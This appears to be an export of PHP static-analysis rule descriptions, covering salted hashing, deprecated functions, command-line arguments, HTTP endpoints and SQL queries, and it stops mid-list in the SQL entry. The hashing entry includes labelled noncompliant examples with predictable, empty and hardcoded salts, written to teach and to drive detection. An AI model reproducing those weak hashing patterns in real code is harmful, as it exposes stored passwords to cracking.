<p>This rule raises an issue when a hashing function which has been specifically designed for hashing sensitive data, such as pbkdf2, is used with a
non-random, reused or too short salt value. It does not raise an issue on base hashing algorithms such as sha1 or md5 as these are often used for
other purposes.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> use hashing functions generating their own salt or generate a long random salt of at least 32 bytes. </li>
  <li> the salt is at least as long as the resulting hash value. </li>
  <li> provide the salt to a safe hashing function such as PBKDF2. </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function createMyAccount() {
  $email = $_GET['email'];
  $name = $_GET['name'];
  $password = $_GET['password'];

  $hash = hash_pbkdf2('sha256', $password, $email, 100000); // Noncompliant; salt (3rd argument) is predictable because initialized with the provided $email

  $hash = hash_pbkdf2('sha256', $password, '', 100000); // Noncompliant; salt is empty

  $hash = hash_pbkdf2('sha256', $password, 'D8VxSmTZt2E2YV454mkqAY5e', 100000); // Noncompliant; salt is hardcoded

  $hash = crypt($password); // Noncompliant; salt is not provided
  $hash = crypt($password, """"); // Noncompliant; salt is hardcoded

  $options = [
    'cost' =&gt; 11,
    'salt' =&gt; mcrypt_create_iv(22, MCRYPT_DEV_URANDOM), // Noncompliant ; use salt generated by default
  ];
  echo password_hash(""rasmuslerdorf"", PASSWORD_BCRYPT, $options);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$salt = openssl_random_pseudo_bytes(16);
$hash = hash_pbkdf2(""sha256"", $password, $salt, $iterations, 20);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Hashes should include an unpredictable salt,[],CRITICAL,"['cwe', 'owasp-a3', 'sans-top25-porous']",VULNERABILITY
2014-11-21T07:03:47+0100,"<p>Deprecated language features are those that have been retained temporarily for backward compatibility, but which will eventually be removed from
the language. In effect, deprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no
use of the deprecated features should be added to the code, and all existing uses should be gradually removed.</p>
<p>The following functions were deprecated in PHP 5:</p>
<table>
  <tbody>
    <tr>
      <th>Deprecated</th>
      <th>Use Instead</th>
    </tr>
    <tr>
      <td><code>call_user_method()</code></td>
      <td><code>call_user_func()</code></td>
    </tr>
    <tr>
      <td><code>call_user_method_array()</code></td>
      <td><code>call_user_func_array()</code></td>
    </tr>
    <tr>
      <td><code>define_syslog_variables()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>dl()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>ereg()</code></td>
      <td><code>preg_match()</code></td>
    </tr>
    <tr>
      <td><code>ereg_replace()</code></td>
      <td><code>preg_replace()</code> (note that this is deprecated in PHP 5.5)</td>
    </tr>
    <tr>
      <td><code>eregi()</code></td>
      <td><code>preg_match()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>eregi_replace()</code></td>
      <td><code>preg_replace()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>set_magic_quotes_runtime()</code> and its alias, <code>magic_quotes_runtime()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>session_register()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>session_unregister()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>session_is_registered()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>set_socket_blocking()</code></td>
      <td><code>stream_set_blocking()</code></td>
    </tr>
    <tr>
      <td><code>split()</code></td>
      <td><code>preg_split()</code></td>
    </tr>
    <tr>
      <td><code>spliti()</code></td>
      <td><code>preg_split()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>sql_regcase()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>mysql_db_query()</code></td>
      <td><code>mysql_select_db()</code> and <code>mysql_query()</code></td>
    </tr>
    <tr>
      <td><code>mysql_escape_string()</code></td>
      <td><code>mysql_real_escape_string()</code></td>
    </tr>
    <tr>
      <td>Passing locale category names as strings</td>
      <td>Use the LC_* family of constants</td>
    </tr>
  </tbody>
</table>
<p>The following functions were deprecated in PHP 7:</p>
<table>
  <tbody>
    <tr>
      <th>Deprecated</th>
      <th>Use Instead</th>
    </tr>
    <tr>
      <td><code>__autoload()</code></td>
      <td><code>spl_autoload_register()</code></td>
    </tr>
    <tr>
      <td><code>create_function()</code></td>
      <td>anonymous function</td>
    </tr>
    <tr>
      <td><code>parse_str()</code> without second argument</td>
      <td><code>parse_str()</code> with second argument</td>
    </tr>
    <tr>
      <td><code>gmp_random()</code></td>
      <td><code>gmp_random_bits()</code> or <code>gmp_random_range()</code></td>
    </tr>
    <tr>
      <td><code>each()</code></td>
      <td><code>foreach</code></td>
    </tr>
    <tr>
      <td><code>assert()</code> with string argument</td>
      <td> </td>
    </tr>
    <tr>
      <td>Defining case-insensitive constants by calling <code>define()</code> with <code>true</code> as third parameter</td>
      <td><code>define(""myconst"", $value)</code> or <code>define(""myconst"", $value, false)</code></td>
    </tr>
    <tr>
      <td><code>FILTER_FLAG_SCHEME_REQUIRED</code> and <code>FILTER_FLAG_HOST_REQUIRED</code> flags</td>
      <td><code>FILTER_VALIDATE_URL</code> flag</td>
    </tr>
    <tr>
      <td><code>fgetss()</code> function, <code>""string.strip_tags""</code> stream filter name, <code>SplFileObject::fgetss()</code> method and
      <code>gzgetss()</code> function</td>
      <td> </td>
    </tr>
    <tr>
      <td><code>mbregex_encoding()</code>, <code>mbereg()</code>, <code>mberegi()</code>, <code>mbereg_replace()</code>,
      <code>mberegi_replace()</code>, <code>mbsplit()</code>, <code>mbereg_match()</code>, <code>mbereg_search()</code>,
      <code>mbereg_search_pos()</code>, <code>mbereg_search_regs()</code>, <code>mbereg_search_init()</code>, <code>mbereg_search_getregs()</code>,
      <code>mbereg_search_getpos()</code>, <code>mbereg_search_setpos()</code></td>
      <td>Use the<br> corresponding <code>mb_ereg_*()</code> variants instead</td>
    </tr>
    <tr>
      <td>string search functions with integer needle (<code>stristr</code>, <code>strrchr</code>, <code>strstr</code>, <code>strripos</code>,
      <code>stripos</code>, <code>strrpos</code>, <code>strpos</code>, <code>strchr</code>) </td>
      <td>use a string needle instead</td>
    </tr>
    <tr>
      <td><code>image2wbmp()</code></td>
      <td><code>imagewbmp()</code></td>
    </tr>
    <tr>
      <td><code>Normalizer::NONE</code></td>
      <td> </td>
    </tr>
    <tr>
      <td>Defining an <code>assert()</code> function inside a namespace</td>
      <td>use the standard <code>assert()</code> function</td>
    </tr>
  </tbody>
</table>
<h2>See</h2>
<ul>
  <li> <a href=""https://wiki.php.net/rfc/deprecations_php_7_3"">PHP RFC: Deprecations for PHP 7.3</a> </li>
  <li> <a href=""https://wiki.php.net/rfc/case_insensitive_constant_deprecation"">PHP RFC: Deprecate and Remove Case-Insensitive Constants</a> </li>
</ul>",php:S2001,php,PHP,"<p>Deprecated language features are those that have been retained temporarily for backward compatibility, but which will eventually be removed from
the language. In effect, deprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no
use of the deprecated features should be added to the code, and all existing uses should be gradually removed.</p>
<p>The following functions were deprecated in PHP 5:</p>
<table>
  <tbody>
    <tr>
      <th>Deprecated</th>
      <th>Use Instead</th>
    </tr>
    <tr>
      <td><code>call_user_method()</code></td>
      <td><code>call_user_func()</code></td>
    </tr>
    <tr>
      <td><code>call_user_method_array()</code></td>
      <td><code>call_user_func_array()</code></td>
    </tr>
    <tr>
      <td><code>define_syslog_variables()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>dl()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>ereg()</code></td>
      <td><code>preg_match()</code></td>
    </tr>
    <tr>
      <td><code>ereg_replace()</code></td>
      <td><code>preg_replace()</code> (note that this is deprecated in PHP 5.5)</td>
    </tr>
    <tr>
      <td><code>eregi()</code></td>
      <td><code>preg_match()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>eregi_replace()</code></td>
      <td><code>preg_replace()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>set_magic_quotes_runtime()</code> and its alias, <code>magic_quotes_runtime()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>session_register()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>session_unregister()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>session_is_registered()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>set_socket_blocking()</code></td>
      <td><code>stream_set_blocking()</code></td>
    </tr>
    <tr>
      <td><code>split()</code></td>
      <td><code>preg_split()</code></td>
    </tr>
    <tr>
      <td><code>spliti()</code></td>
      <td><code>preg_split()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>sql_regcase()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>mysql_db_query()</code></td>
      <td><code>mysql_select_db()</code> and <code>mysql_query()</code></td>
    </tr>
    <tr>
      <td><code>mysql_escape_string()</code></td>
      <td><code>mysql_real_escape_string()</code></td>
    </tr>
    <tr>
      <td>Passing locale category names as strings</td>
      <td>Use the LC_* family of constants</td>
    </tr>
  </tbody>
</table>
<p>The following functions were deprecated in PHP 7:</p>
<table>
  <tbody>
    <tr>
      <th>Deprecated</th>
      <th>Use Instead</th>
    </tr>
    <tr>
      <td><code>__autoload()</code></td>
      <td><code>spl_autoload_register()</code></td>
    </tr>
    <tr>
      <td><code>create_function()</code></td>
      <td>anonymous function</td>
    </tr>
    <tr>
      <td><code>parse_str()</code> without second argument</td>
      <td><code>parse_str()</code> with second argument</td>
    </tr>
    <tr>
      <td><code>gmp_random()</code></td>
      <td><code>gmp_random_bits()</code> or <code>gmp_random_range()</code></td>
    </tr>
    <tr>
      <td><code>each()</code></td>
      <td><code>foreach</code></td>
    </tr>
    <tr>
      <td><code>assert()</code> with string argument</td>
      <td> </td>
    </tr>
    <tr>
      <td>Defining case-insensitive constants by calling <code>define()</code> with <code>true</code> as third parameter</td>
      <td><code>define(""myconst"", $value)</code> or <code>define(""myconst"", $value, false)</code></td>
    </tr>
    <tr>
      <td><code>FILTER_FLAG_SCHEME_REQUIRED</code> and <code>FILTER_FLAG_HOST_REQUIRED</code> flags</td>
      <td><code>FILTER_VALIDATE_URL</code> flag</td>
    </tr>
    <tr>
      <td><code>fgetss()</code> function, <code>""string.strip_tags""</code> stream filter name, <code>SplFileObject::fgetss()</code> method and
      <code>gzgetss()</code> function</td>
      <td> </td>
    </tr>
    <tr>
      <td><code>mbregex_encoding()</code>, <code>mbereg()</code>, <code>mberegi()</code>, <code>mbereg_replace()</code>,
      <code>mberegi_replace()</code>, <code>mbsplit()</code>, <code>mbereg_match()</code>, <code>mbereg_search()</code>,
      <code>mbereg_search_pos()</code>, <code>mbereg_search_regs()</code>, <code>mbereg_search_init()</code>, <code>mbereg_search_getregs()</code>,
      <code>mbereg_search_getpos()</code>, <code>mbereg_search_setpos()</code></td>
      <td>Use the<br> corresponding <code>mb_ereg_*()</code> variants instead</td>
    </tr>
    <tr>
      <td>string search functions with integer needle (<code>stristr</code>, <code>strrchr</code>, <code>strstr</code>, <code>strripos</code>,
      <code>stripos</code>, <code>strrpos</code>, <code>strpos</code>, <code>strchr</code>) </td>
      <td>use a string needle instead</td>
    </tr>
    <tr>
      <td><code>image2wbmp()</code></td>
      <td><code>imagewbmp()</code></td>
    </tr>
    <tr>
      <td><code>Normalizer::NONE</code></td>
      <td> </td>
    </tr>
    <tr>
      <td>Defining an <code>assert()</code> function inside a namespace</td>
      <td>use the standard <code>assert()</code> function</td>
    </tr>
  </tbody>
</table>
<h2>See</h2>
<ul>
  <li> <a href=""https://wiki.php.net/rfc/deprecations_php_7_3"">PHP RFC: Deprecations for PHP 7.3</a> </li>
  <li> <a href=""https://wiki.php.net/rfc/case_insensitive_constant_deprecation"">PHP RFC: Deprecate and Remove Case-Insensitive Constants</a> </li>
</ul>",Deprecated features should not be used,[],MAJOR,['obsolete'],CODE_SMELL
2019-01-18T12:20:02+0100,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Questionable Code Example</h2>
<p>Builtin access to <code>$argv</code></p>
<pre>
function globfunc() {
    global $argv; // Questionable. Reference to global $argv
    foreach ($argv as $arg) { // Questionable.
        // ...
    }
}

function myfunc($argv) {
    $param = $argv[0]; // OK. Reference to local $argv parameter
    // ...
}

foreach ($argv as $arg) { // Questionable. Reference to $argv.
    // ...
}

$myargv = $_SERVER['argv']; // Questionable. Equivalent to $argv.

function serve() {
    $myargv = $_SERVER['argv']; // Questionable.
    // ...
}

myfunc($argv); // Questionable

$myvar = $HTTP_SERVER_VARS[0]; // Questionable. Note: HTTP_SERVER_VARS has ben removed since PHP 5.4.

$options = getopt('a:b:'); // Questionable. Parsing arguments.

$GLOBALS[""argv""]; // Questionable. Equivalent to $argv.

function myglobals() {
    $GLOBALS[""argv""]; // Questionable
}

$argv = [1,2,3]; // Questionable. It is a bad idea to override argv.
</pre>
<p>Zend Console</p>
<pre>
new Zend\Console\Getopt(['myopt|m' =&gt; 'this is an option']); // Questionable
</pre>
<p>Getopt-php library</p>
<pre>
new \GetOpt\Option('m', 'myoption', \GetOpt\GetOpt::REQUIRED_ARGUMENT); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",php:S4823,php,PHP,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Questionable Code Example</h2>
<p>Builtin access to <code>$argv</code></p>
<pre>
function globfunc() {
    global $argv; // Questionable. Reference to global $argv
    foreach ($argv as $arg) { // Questionable.
        // ...
    }
}

function myfunc($argv) {
    $param = $argv[0]; // OK. Reference to local $argv parameter
    // ...
}

foreach ($argv as $arg) { // Questionable. Reference to $argv.
    // ...
}

$myargv = $_SERVER['argv']; // Questionable. Equivalent to $argv.

function serve() {
    $myargv = $_SERVER['argv']; // Questionable.
    // ...
}

myfunc($argv); // Questionable

$myvar = $HTTP_SERVER_VARS[0]; // Questionable. Note: HTTP_SERVER_VARS has ben removed since PHP 5.4.

$options = getopt('a:b:'); // Questionable. Parsing arguments.

$GLOBALS[""argv""]; // Questionable. Equivalent to $argv.

function myglobals() {
    $GLOBALS[""argv""]; // Questionable
}

$argv = [1,2,3]; // Questionable. It is a bad idea to override argv.
</pre>
<p>Zend Console</p>
<pre>
new Zend\Console\Getopt(['myopt|m' =&gt; 'this is an option']); // Questionable
</pre>
<p>Getopt-php library</p>
<pre>
new \GetOpt\Option('m', 'myoption', \GetOpt\GetOpt::REQUIRED_ARGUMENT); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Using command line arguments is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-insecure']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint. It guides security code reviews to security-sensitive code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Questionable Code Example</h2>
<p>CakePHP</p>
<pre>
use Cake\Routing\Router;

Router::scope('/', function ($routes) { // Questionable
    // ...
});

Router::connect('/', ['controller' =&gt; 'MyController', 'action' =&gt; 'index']); // Questionable

Router::plugin('MyPlugin', function ($routes) { // Questionable
    // ...
});

Router::prefix('admin', function ($routes) { // Questionable
    // ...
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S4529,php,PHP,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint. It guides security code reviews to security-sensitive code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Questionable Code Example</h2>
<p>CakePHP</p>
<pre>
use Cake\Routing\Router;

Router::scope('/', function ($routes) { // Questionable
    // ...
});

Router::connect('/', ['controller' =&gt; 'MyController', 'action' =&gt; 'index']); // Questionable

Router::plugin('MyPlugin', function ($routes) { // Questionable
    // ...
});

Router::prefix('admin', function ($routes) { // Questionable
    // ...
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Exposing HTTP endpoints is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'owasp-a7', 'sans-top25-insecure', 'sans-top25-porous', 'sans-top25-risky', 'spring']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include
input that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL
binding mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule raises an issue when an execution of SQL queries might be susceptible to SQL injection. The goal is to guide security code reviews.</p>
<p>The following native database functions don't support prepared statements, thus their use is considered susceptible to injection.</p>
<ul>
  <li> <code>mysql_query</code> </li>
  <li> <code>mysql_db_query</code> </li>
  <li> <code>mysql_unbuffered_query</code> </li>
  <li> <code>pg_update</code> </li>
  <li> <code>pg_query</code> </li>
  <li> <code>pg_send_query</code> </li>
  <li> <code>mssql_query</code> </li>
  <li> <code>mysqli_query</code> and <code>mysqli::query</code> </li>
  <li> <code>mysqli_real_query</code> and <code>mysqli::real_query</code> </li>
  <li> <code>mysqli_multi_query</code> and <code>mysqli::multi_query</code> </li>
  <li> <code>mysqli_send_query</code> and <code>mysqli::send_query</code> </li>
  <li> <code>PDO::query</code> </li>
  <li> <code>PDO::exec</code> </li>
</ul>
<p>In addition, the following function call will also raise an issue if the provided query is a string with one or more interpolated variable
(containing ""$"" sign).</p>
<ul>
  <li> <code>PDO::prepare</code> </li>
